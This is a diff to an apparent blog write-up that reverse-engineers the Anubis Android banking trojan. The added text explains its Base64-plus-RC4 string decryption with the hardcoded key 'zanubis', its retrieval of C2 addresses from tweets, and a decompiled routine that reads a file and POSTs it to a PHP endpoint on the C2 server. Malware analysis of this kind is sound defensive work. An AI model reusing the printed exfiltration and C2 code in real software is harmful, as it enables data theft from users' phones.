@@ -801,8 +801,7 @@ then <code>str</code> is reassigned to itself with its every <code>BankingApps.f
         <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">consts2</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">();</span>
         <span style="color:#66d9ef">return</span> mo226c<span style="color:#f92672">(</span>str<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;zanubis&#34;</span><span style="color:#f92672">);</span>
     <span style="color:#f92672">}</span>
-</code></pre></div><p>Alright i guess this is how this malware got its name :). anyways, this method does nothing but calling another method with our string and <code>zanubis</code> as an
-arguments. And i think we should trace it with frida.</p>
+</code></pre></div><p>Alright i guess this is how this malware got its name :). anyways, this method does nothing but calling another method with our string and <code>zanubis</code> as an arguments. And i think we should trace it with frida.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#e6db74">&#39;use strict&#39;</span>;
 
 <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">available</span>) {
@@ -835,21 +834,70 @@ arguments. And i think we should trace it with frida.</p>
 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> callback -&gt;  <span style="color:#f92672">=</span>&gt; <span style="color:#66d9ef">return</span>: 
 </code></pre></div><p>It seems like <code>MakeTwitterRequest</code> is not the only function that calls <code>SomeHttpClass.mo230d()</code>. And doesnt that string looks familiar? yaee.. its the same string we saw in the shared preference xml file.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;string</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;urls&#34;</span><span style="color:#f92672">&gt;</span>ZWViZGQ3NjRjOGZlOWNjMjAzODhhNzFhNzg4MDJi&amp;#10;    <span style="color:#f92672">&lt;/string&gt;</span>
-
-</code></pre></div><p>and the return value is a url. <code>http://cdnjs.su</code>, it is the same url that we met when we were analyzing <code>SomeHttpClass.mo234e</code> with frida, which will
-return after its been decoded if we request <code>url</code> key from the shared preference. So my assumption on <code>SomeHttpClass.mo226c</code> being a decoder function is true!</p>
+</code></pre></div><p>and the return value is a url. <code>http://cdnjs.su</code>, it is the same url that we met when we were analyzing
+<code>SomeHttpClass.mo234e</code> with frida, which will return after its been decoded if we request <code>url</code> key from the shared
+preference. So my assumption on <code>SomeHttpClass.mo226c</code> being a decoder function is true!</p>
 <p>Since the web request that malware returns an empty string, we get nothing decoded :(.</p>
+<p>take a look at <code>SomeHttpClass.mo226c</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">mo226c</span><span style="color:#f92672">(</span>String str<span style="color:#f92672">,</span> String str2<span style="color:#f92672">){</span>
+        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> String<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> C0063a<span style="color:#f92672">(</span>str2<span style="color:#f92672">.</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">mo358a</span><span style="color:#f92672">(</span>mo223b<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> String<span style="color:#f92672">(</span>Base64<span style="color:#f92672">.</span><span style="color:#a6e22e">decode</span><span style="color:#f92672">(</span>str<span style="color:#f92672">,</span> 0<span style="color:#f92672">),</span> <span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="color:#f92672">))));</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception unused<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">}</span>
+</code></pre></div><p>So it does look like this function is not only a decoder but also a decrypter. Let&rsquo;s take a look at class <code>C0063a</code>.</p>
+<pre tabindex="0"><code>public class C0063a {
+
+    [... code here]
+
+    public C0063a(byte[] bArr) {
+        this.f485a = m305c(bArr);
+    }
+</code></pre><p><code>C0063a</code> constructor calls another method.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">m305c</span><span style="color:#f92672">(</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> key<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">int</span><span style="color:#f92672">[]</span> iArr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">[</span>256<span style="color:#f92672">];</span>
+        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span> i <span style="color:#f92672">&lt;</span> 256<span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
+            iArr<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> i<span style="color:#f92672">;</span>
+        <span style="color:#f92672">}</span>
+        <span style="color:#66d9ef">int</span> i2 <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span>
+        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i3 <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span> i3 <span style="color:#f92672">&lt;</span> 256<span style="color:#f92672">;</span> i3<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
+            i2 <span style="color:#f92672">=</span> <span style="color:#f92672">(((</span>i2 <span style="color:#f92672">+</span> iArr<span style="color:#f92672">[</span>i3<span style="color:#f92672">])</span> <span style="color:#f92672">+</span> key<span style="color:#f92672">[</span>i3 <span style="color:#f92672">%</span> key<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">])</span> <span style="color:#f92672">+</span> 256<span style="color:#f92672">)</span> <span style="color:#f92672">%</span> 256<span style="color:#f92672">;</span>
+            swap<span style="color:#f92672">(</span>i3<span style="color:#f92672">,</span> i2<span style="color:#f92672">,</span> iArr<span style="color:#f92672">);</span>
+        <span style="color:#f92672">}</span>
+        <span style="color:#66d9ef">return</span> iArr<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+</code></pre></div><p>So what this does is, creates an int array of size 256, fill it with numbers from 0 - 255, loop through 0 - 255 and
+do below expression</p>
+<pre><code>    - i2 = (((i2 + iArr[i3]) + key[i3 % key.length]) + 256) % 256;
+</code></pre>
+<p>well this looks like rc4 algorithm. swap function is pretty simple.</p>
+<p>then the array is returned and following method is applied on it by the <code>SomeHttpClass.mo226c</code> method.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">m305c</span><span style="color:#f92672">(</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bArr<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">int</span><span style="color:#f92672">[]</span> iArr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">[</span>256<span style="color:#f92672">];</span>
+        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span> i <span style="color:#f92672">&lt;</span> 256<span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
+            iArr<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> i<span style="color:#f92672">;</span>
+        <span style="color:#f92672">}</span>
+        <span style="color:#66d9ef">int</span> i2 <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span>
+        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i3 <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span> i3 <span style="color:#f92672">&lt;</span> 256<span style="color:#f92672">;</span> i3<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
+            i2 <span style="color:#f92672">=</span> <span style="color:#f92672">(((</span>i2 <span style="color:#f92672">+</span> iArr<span style="color:#f92672">[</span>i3<span style="color:#f92672">])</span> <span style="color:#f92672">+</span> bArr<span style="color:#f92672">[</span>i3 <span style="color:#f92672">%</span> bArr<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">])</span> <span style="color:#f92672">+</span> 256<span style="color:#f92672">)</span> <span style="color:#f92672">%</span> 256<span style="color:#f92672">;</span>
+            swap<span style="color:#f92672">(</span>i3<span style="color:#f92672">,</span> i2<span style="color:#f92672">,</span> iArr<span style="color:#f92672">);</span>
+        <span style="color:#f92672">}</span>
+        <span style="color:#66d9ef">return</span> iArr<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+</code></pre></div><p>aand this confirms the assumption that this malware uses <strong>rc4 algorithm</strong>. However, unlike many other malware, anubis seems to use a hardcoded key, rather than generating a key on the fly, which is <code>zanubis</code>.</p>
 <p>As a summery what <code>MakeTwitterRequest</code> does is,</p>
-<pre><code>    - makes a requests to the url `https://twitter.com/qweqweqwe`.
+<pre><code>    - makes a requests to the url `https://twitter.com/qweqweqwe`, which contains tweets in chinese.
     - read the response html in to a buffer and remove all the spaces.
     - save the string in between `苏尔的开始`, `苏尔苏尔完` of the response html in `str`.
     - for each chinese character in `str`, replace it with a corresponding alphanumerical character (which results in a base64 encoded string).
-    - decode what's in `str` and save it back in `str`.
+    - decode base64 encoded string in `str` and decrypt it using RC4, with key being equal to `zanubis` 
+    - store return value back in `str`.
 </code></pre>
-<p>However we dont really know what malware expects from the reponse html and what is the use of decoded data.
+<p>However we dont really know what malware expects from the reponse html and what is the use of decoded and decrypted data. But i suspect main purpose of this snippet is to extract C2 server addresses from the tweets of the user.
 Now we can move onto another interesting methods of the <code>SomeHttpClass</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mo211a</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">,</span> String str<span style="color:#f92672">,</span> String str2<span style="color:#f92672">,</span> String str3<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#f92672">/*</span> 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mo211a</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">,</span> String str<span style="color:#f92672">,</span> String str2<span style="color:#f92672">,</span> String str3<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> 
         String e <span style="color:#f92672">=</span> getSharedPreference<span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;websocket&#34;</span><span style="color:#f92672">);</span>
         StringBuilder sb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
         sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span>e<span style="color:#f92672">);</span>
@@ -862,13 +910,13 @@ Now we can move onto another interesting methods of the <code>SomeHttpClass</cod
 well if we grep that part out from the xml,</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">   &lt;string name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;websocket&#34;</span>&gt;&lt;/string&gt;
 </code></pre></div><p>it&rsquo;s empty. Well my guess is that this will be filled later by the malware.</p>
-<p>then <code>sb</code> is appended with <code>/o1o/a1.php</code> and the resulting string (url) is stored in <code>sb2</code>.</p>
-<pre tabindex="0"><code>        File file = new File(str);
-        byte[] a = ReadFile(file);
-        if (str2.equals(&quot;&quot;)) {
-            str2 = mo247q(context) + &quot;-&quot; + file.getName();
-        }
-</code></pre><p>then it creates a file taking the second argument as the filename and passes the file as an argument to <code>SomeHttpClass.ReadFile</code>. then it check if third argument (<code>str2</code>) is an empty string, if so, it calls another method named <code>SomeHttpClass.mo247q</code>, concatanate the return value with <code>-</code> and the file&rsquo;s name.</p>
+<p>then <code>sb</code> is appended with <code>/o1o/a1.php</code>, which looks like a <strong>php endpoint</strong>, and the resulting string (url) is stored in <code>sb2</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        File file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>str<span style="color:#f92672">);</span>
+        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> a <span style="color:#f92672">=</span> ReadFile<span style="color:#f92672">(</span>file<span style="color:#f92672">);</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>str2<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+            str2 <span style="color:#f92672">=</span> mo247q<span style="color:#f92672">(</span>context<span style="color:#f92672">)</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#f92672">+</span> file<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">();</span>
+        <span style="color:#f92672">}</span>
+</code></pre></div><p>then it creates a file taking the second argument as the filename and passes the file as an argument to <code>SomeHttpClass.ReadFile</code>. then it check if third argument (<code>str2</code>) is an empty string, if so, it calls another method named <code>SomeHttpClass.mo247q</code>, concatanate the return value with <code>-</code> and the file&rsquo;s name.</p>
 <p>first of all, all what <code>ReadFile</code> method does is, as the name implies, reading a file and returning it as a byte array.
 in this case, it reads file specified in <code>str</code> and returns the contents, which will then be stored in byte array <code>a</code>.</p>
 <p>Now let&rsquo;s take a look at <code>SomeHttpClass.mo247q</code>.</p>
@@ -889,7 +937,16 @@ However, if it is failed to extract this information, it creates a unique ID by 
         httpURLConnection<span style="color:#f92672">.</span><span style="color:#a6e22e">setRequestProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Connection&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Keep-Alive&#34;</span><span style="color:#f92672">);</span>
         httpURLConnection<span style="color:#f92672">.</span><span style="color:#a6e22e">setRequestProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Cache-Control&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;no-cache&#34;</span><span style="color:#f92672">);</span>
         httpURLConnection<span style="color:#f92672">.</span><span style="color:#a6e22e">setRequestProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;multipart/form-data;boundary=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;*****&#34;</span><span style="color:#f92672">);</span>
-</code></pre></div><p>Lets get an idea of how this malware gets banking applications.</p>
+</code></pre></div><p>in the above snippet, method <code>SomeHttpClass.mo211a</code> creates a new HttpURLConnection to the url stored in <code>sb2</code>. then it modifies some attributes of the Http
+Connection. for example, it first sets <code>UseCaches</code> to false, <code>DoOutput</code> to true and <code>RequestMethod</code> to <code>&quot;POST&quot;</code>. It also sets RequestProperties like, <code>&quot;Connection&quot;</code> to <code>&quot;Keep-Alive&quot;</code>, <code>&quot;Cache-Control&quot;</code> to <code>&quot;no-cache&quot;</code> and <code>&quot;Content-Type&quot;</code> to <code>&quot;multipart/form-data;boundary=*****&quot;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        DataOutputStream dataOutputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> DataOutputStream<span style="color:#f92672">(</span>httpURLConnection<span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputStream</span><span style="color:#f92672">());</span>
+        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeBytes</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;--&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;*****&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n&#34;</span><span style="color:#f92672">);</span>
+        StringBuilder sb3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
+        sb3<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Content-Disposition: form-data; name=\&#34;serverID\&#34;&#34;</span><span style="color:#f92672">);</span>
+        sb3<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\r\n&#34;</span><span style="color:#f92672">);</span>
+</code></pre></div><p>then it creates a <code>DataOutputStream</code> out from the HttpURLConnection it created before. then it writes following string to the output stream.</p>
+<p><code>--*****\r\n</code></p>
+<p>Lets get an idea of how this malware gets banking applications.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">/* renamed from: wocwvy.czyxoxmbauu.slsa.a */</span>
 <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">BankingApps</span> <span style="color:#f92672">{</span>
 
